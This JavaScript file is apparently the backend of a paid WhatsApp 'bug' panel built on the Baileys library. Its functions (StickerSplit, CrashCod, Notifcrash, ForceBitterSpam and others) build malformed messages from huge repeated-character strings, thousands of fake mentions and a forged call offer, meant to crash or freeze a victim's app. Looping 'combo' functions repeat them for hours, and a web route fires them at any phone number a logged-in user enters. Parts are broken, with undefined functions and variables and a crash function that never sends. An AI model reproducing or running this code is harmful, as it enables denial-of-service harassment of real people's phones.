const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const crypto = require('crypto');

// --- GLOBAL VARIABLES ---
let userApiBug = null;
let sock; // Global fallback
let lastExecution = 0;
const activeWebUsers = new Map();
const activeSessions = new Map();
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const delay = sleep; // Alias

// --- HTML RENDERER ---
const executionPage = (status = "🟥 Ready", detail = {}, isForm = true, userInfo = {}, userKey = "", message = "", mode = "") => {
    const { username, expired, role } = userInfo;
    
    const formattedTime = expired ? new Date(expired).toLocaleString("id-ID", { 
        timeZone: "Asia/Jakarta", 
        year: "2-digit", month: "2-digit", day: "2-digit", 
        hour: "2-digit", minute: "2-digit" 
    }) : "-";

    const rawRole = (role || 'user').toLowerCase();
    let roleHtml = "";

    switch (rawRole) {
        case "owner": case "creator": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
        case "admin": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
        case "reseller": case "ress": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;"> Reseller</span>'; break;
        case "pt": roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
        case "vip": roleHtml = '<span style="color: #FFFFFF;">VIP</span>'; break;
        case "moderator": roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
        default: roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
    }

    const filePath = path.join(__dirname, "KeiraaIndex", "SparkGo.html");

    try {
        let html = fs.readFileSync(filePath, "utf8");
        return html
            .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
            .replace(/\$\{userKey\}/g, userKey || "")
            .replace(/\$\{password\}/g, userKey || "")
            .replace(/\{\{password\}\}/g, userKey || "")
            .replace(/\{\{key\}\}/g, userKey || "")
            .replace(/\$\{key\}/g, userKey || "")
            .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
            .replace(/\$\{username\}/g, username || "Unknown")
            .replace(/\{\{username\}\}/g, username || "Unknown")
            .replace(/\{\{expired\}\}/g, formattedTime)
            .replace(/\$\{formattedTime\}/g, formattedTime)
            .replace(/\{\{status\}\}/g, status)
            .replace(/\{\{message\}\}/g, message)
            .replace(/\$\{displayRole\}/g, roleHtml)
            .replace(/\$\{rawRole\}/g, rawRole)
            .replace(/\$\{activeConnections\}/g, activeSessions);
    } catch (err) {
        console.error(err);
        return `<h1>Error Loading HTML</h1>`;
    }
};

// --- BUG FUNCTIONS (ALL ACCEPT 'sock') ---
async function CrashHit(sock, target) {
  let msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "MAKLO ANJING",
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: -0,
                        },
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),                         
                            },
                        ],
                        messageParamsJson: "[{".repeat(10000),
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
        },
    };
}

async function StickerSplit(sock, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 4000 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: X,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}
async function ForceBitterSpam(target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let ZayCoreX = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: '🩸YT ZayyOfficial'
                    },
                    footer: {
                        text: '🩸YT ZayyOfficial'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: '🩸YT NandoOfficial'
                            },
                            footer: {
                                text: '🩸YT NandoOfficial'
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, ZayCoreX, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}
async function payloadOneMsg(sock, target) {
    await sock.relayMessage(target, {
        requestPaymentMessage: {
          currencyCodeIso4217: "IDR",
          requestFrom: target,
          expiryTimestamp: Date.now() + 8000, 
          amount: 1,
        }
      }, { statusJidList: [target] });
}

async function CrashCod(sock, X) {
  try {
    const Msg = {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "123@g.us",
            inviteCode: "ꦾ".repeat(2000),
            inviteExpiration: 99999999999,
            groupName: "This Is SilentKiller" + "ꦽ".repeat(100000),
            caption: "宾·弗鲁特" + 
            "ꦽ".repeat(100000) +
             "ꦾ".repeat(200000),
            contextInfo: {
              participant: { jid: X },
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
              ]
            },
            nativeFlowMessage: {
              buttonParamsJson: "\n".repeat(100000),
              buttons: [
                { name: "single_select", buttonParamsJson: "ꦽ".repeat(100000) },
                { name: "call_permission_request", buttonParamsJson: "ꦽ".repeat(100000) },
                { name: "address_message", buttonParamsJson: "ꦽ".repeat(100000) },
                { name: "galaxy_message", buttonParamsJson: "ꦽ".repeat(100000) },
                { name: "view_product", buttonParamsJson: "ꦽ".repeat(100000) }
              ]
            }
          }
        }
      }
    };

    const Build = await generateWAMessageFromContent(X, Msg, {});

    await sock.relayMessage(X, Build.message, {
      messageId: Build.key.id
    });

  } catch (e) {
    console.log("Buldozer Error:", e);
  }
}
async function Notifcrash(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Pova NoLimit" + "ꦽ".repeat(20000),
        url: "https://t.me/" + "Keiraa_md" + "ꦽ".repeat(20000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "ꦽ".repeat(20000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "Pova NoLimit" + "ꦽ".repeat(20000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, msg.message, {
    messageId: msg.key?.id,
    quoted: null
  });
}
// --- COMBO FUNCTIONS (UPDATED SIGNATURES) ---

async function DelayHard(sock, X) {
    for (let r = 0; r < 5; r++) {
        await StickerSplit(sock, X);
        await Delaypayload(sock, X);
        await sleep(2000);
    }
}

async function CrashNotif(sock, target) {
    for (let r = 0; r < 100; r++) {
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
        await Notifcrash(sock, target);
    }
}

async function IsagiComboFc1(sock, durationHours, target) {
    const totalDurationMs = durationHours * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;
    let batch = 0;
    const maxBatch = 2;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch >= maxBatch) {
            console.log(`🛑 Stopped IsagiCombo`);
            return;
        }
        try {
            if (count < 30) {
                await payloadOneMsg(sock, target);
                console.log(chalk.hex('#00BFFF')(`[ Keiraa Executed ] SuccesFull Send !!`));
                count++;
                setTimeout(sendNext, 100);
            } else {
                count = 0;
                batch++;
                if (batch < maxBatch) setTimeout(sendNext, 100);
            }
        } catch (error) {
            console.error(`❌ Error: ${error.message}`);
            setTimeout(sendNext, 100);
        }
    };
    sendNext();
}

async function Crashandroid(sock, durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) return;

    try {
      if (count < 10) {
        await CrashNotif(sock, target);
        await StickerSplit(sock, target);
        await StickerSplit(sock, target);
        await StickerSplit(sock, target);
        await StickerSplit(sock, target);
        await StickerSplit(sock, target);
        await StickerSplit(sock, target);
        console.log(chalk.red(`[ Keiraa Executed ] Succesfull Send !!`));
        count++;
        setTimeout(sendNext, 4000);
      } else {
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 60000);
        }
      }
    } catch (error) {
      console.error(`✗ Error: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function DelayBapakLo(sock, durationHours, X) {
  const sendNext = async () => {
      try {
          await DelayPayloadCombo(sock, X);
          await DelayHard(sock, X);
          await KeiraaZxena(sock, X);
          await sleep(2000);
          console.log(chalk.red(`❄️ DelayBapakLo Hit`));
      } catch (e) { }
  }
  sendNext();
}

async function Forclose(sock, durationHours, X) {
    const sendNext = async () => {
        try {
            await FcSilent(sock, X);
            await sleep(1000);
            console.log(chalk.red(`Fc Hit`));
        } catch (e) { }
    };
    sendNext();
}

// --- MAIN MODULE EXPORT ---

module.exports = function(app, sessions, getUsers) {
    
    app.get("/execution", (req, res) => {
        
        // 1. Cek Login
        if (!req.cookies || !req.cookies.sessionUser) {
            return res.redirect('/login');
        }

        const username = req.cookies.sessionUser;
        const users = getUsers();
        const currentUser = users.find(u => u.username === username);

        if (!currentUser) {
            return res.clearCookie("sessionUser").redirect('/login');
        }

        if (currentUser.expired && Date.now() > currentUser.expired) {
            return res.redirect('/login?msg=Expired');
        }

        // 2. Logika User Online
        const nowTime = Date.now();
        activeWebUsers.set(username, nowTime);
        for (const [user, time] of activeWebUsers) {
            if (nowTime - time > 300000) activeWebUsers.delete(user);
        }
        const totalOnlineUsers = activeWebUsers.size; 
        const activeCount = sessions ? sessions.size : 0;

        // 3. Request Bug
        const targetNumber = req.query.target;
        const mode = req.query.mode;

        if (targetNumber || mode) {
            // FIND VALID SOCKET
            let currentSock = null;
            if (sessions && sessions.size > 0) {
                const allSockets = [...sessions.values()];
                currentSock = allSockets.find(s => s && s.user);
            }

            if (!currentSock) {
                return res.send(executionPage("⚠️ NO SENDER", { message: "Bot belum terhubung!" }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));
            }

            // Set Global
            sock = currentSock;
            
            const now = Date.now();
            const cooldown = 3 * 60 * 1000;
            if ((now - lastExecution < cooldown)) {
                const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
                return res.send(executionPage("⏳ COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, "", activeCount, totalOnlineUsers));
            }

            const target = `${targetNumber}@s.whatsapp.net`;

            try {
                // EXECUTE BUG WITH SOCKET
                if (mode === "uisystem") Crashandroid(currentSock, 24, target);
                else if (mode === "invis") DelayBapakLo(currentSock, 24, target);
                else if (mode === "fc") IsagiComboFc1(currentSock, 24, target);
                else if (mode === "xkill") Forclose(currentSock, 24, target); 
                else throw new Error("Mode tidak dikenal.");

                lastExecution = now;
                console.log(chalk.red(`System Sending Bug to ${targetNumber} | Mode: ${mode}`));

                return res.send(executionPage("✓ SUCCESS", {
                    target: targetNumber,
                    timestamp: new Date().toLocaleString("id-ID"),
                    message: `Executing ${mode.toUpperCase()}...`
                }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));

            } catch (err) {
                console.error(err);
                return res.send(executionPage("✗ Error", { target: targetNumber, message: "Server Error" }, false, currentUser, currentUser.key, mode, activeCount, totalOnlineUsers));
            }
        }

        res.send(executionPage("🟥 Ready", {}, true, currentUser, currentUser.key, ""));
    });
    
        // --- RUTE BARU: PUBLIC CHAT PAGE ---
        // --- RUTE BARU: PUBLIC CHAT PAGE (FIX TOTAL USER) ---
    app.get("/tools/public-chat", (req, res) => {
        // 1. Cek Login
        if (!req.cookies || !req.cookies.sessionUser) return res.redirect('/login');
        
        const username = req.cookies.sessionUser;
        const users = getUsers(); // Ambil semua data user dari database
        const currentUser = users.find(u => u.username === username);
        
        if (!currentUser) return res.redirect('/login');

        // 2. Siapkan Data
        const role = currentUser.role || 'Member';
        const totalUserCount = users.length; // Hitung Total User Database
        
        // Hitung User Online (Dari Map activeWebUsers yang ada di atas)
        // Pastikan activeWebUsers sudah didefinisikan di global variable file ini
        const onlineUserCount = activeWebUsers ? activeWebUsers.size : 0; 
        
        // 3. Baca File HTML
        const chatFilePath = path.join(__dirname, "KeiraaIndex", "PublicChat.html");
        
        try {
            let html = fs.readFileSync(chatFilePath, "utf8");
            
            // 4. Inject Data ke HTML
            html = html
                .replace(/\$\{username\}/g, username)
                .replace(/\$\{role\}/g, role)
                .replace(/\$\{totalUsers\}/g, totalUserCount)   // <--- Inject Total
                .replace(/\$\{onlineUsers\}/g, onlineUserCount); // <--- Inject Online
                
            res.send(html);
        } catch (e) {
            console.error(e);
            res.send("<h1>404: PublicChat.html Not Found</h1>");
        }
    });
};